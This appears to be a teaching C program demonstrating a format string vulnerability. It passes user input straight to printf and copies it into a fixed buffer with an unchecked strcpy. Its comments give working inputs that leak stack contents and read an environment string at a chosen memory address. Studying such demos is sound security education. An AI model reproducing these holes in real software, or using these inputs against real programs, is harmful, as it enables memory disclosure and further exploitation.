#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
HOW TO SEE WHERE THE FORMAT PARAMETER IS READING FROM:
The 12th format parameter will attempt to print the string
located at 0x41414141 (AAAA):
./fmt_str_vuln $(perl -e 'print "AAAA" . "%08x."x12')


HOW TO READ A STRING AT A MEMORY ADDRESS:
Use getenvaddr to find memory location of PATH:
./getenvaddr PATH ./fmt_str_vuln

PATH is at: 0x6127b829 on my computer.

Then use this to print PATH
./fmt_str_vuln $(printf "\x29\xb8\x27\x61")%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%s
*/

int main(int argc, char* argv[])
{
	char text[1024];
	static int test_val = -72;

	if(argc < 2)
	{
		printf("Usage: %s <text to print>\n", argv[0]);
		exit(0);
	}

	strcpy(text, argv[1]);

	printf("The right way to print user-controlled input:\n");
	printf("%s", text);

	printf("\nThe wrong way to print user-controlled input:\n");
	printf(text);

	printf("\n");

	// Debug output
	printf("[*] test_val @ 0x%08x = %d 0x%08x\n", &test_val, test_val, test_val);

	exit(0);
}
